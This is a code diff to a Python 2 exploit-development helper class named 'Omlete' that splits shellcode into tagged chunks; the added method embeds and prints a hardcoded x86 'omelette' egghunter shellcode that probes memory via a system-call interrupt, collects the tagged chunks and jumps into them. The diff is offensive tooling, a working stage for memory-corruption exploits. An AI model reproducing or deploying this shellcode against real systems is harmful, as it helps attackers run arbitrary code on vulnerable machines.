@@ -1,3 +1,5 @@
+import sys
+
 class Omlete(object):
 
 	def __init__(self, chunk_size=None, padding=None, tag=None, shellcode=None, var_name=None):
@@ -17,6 +19,12 @@ class Omlete(object):
 	    arrs.append(arr)
 	    return arrs
 
+	def small_omlete(self):
+		omlete_hunter = ("\\x89\\xe5\\x66\\x81\\xcb\\xff\\x0f\\x43\\x31\\xc0\\xb0\\x02\\x89\\xda\\xcd\\x2e"
+			"\\x3c\\x05\\x74\\xee\\xb8\\x12\\x34\\x56\\x78\\x89\\xdf\\xaf\\x75\\xe9\\x89\\xfe\\x89\\xef\\x66"
+			"\\xad\\x31\\xc9\\x88\\xe1\\x3c\\x01\\xf3\\xa4\\x89\\xfd\\x75\\xd7\\xff\\xe4")
+		return "omlete_hunter=\""+omlete_hunter+"\""
+
 	def generate(self):
 		count = 0
 		try:
@@ -27,6 +35,9 @@ class Omlete(object):
 		arrs = self.split(data, self.chunk_size)
 		if not self.var_name:
 			self.var_name = 'OMLETE'
+		omlete_shell = self.small_omlete()
+		print omlete_shell
+		print "\n"
 		for i, arr in enumerate(arrs):
 			count += 1
 			shell = []
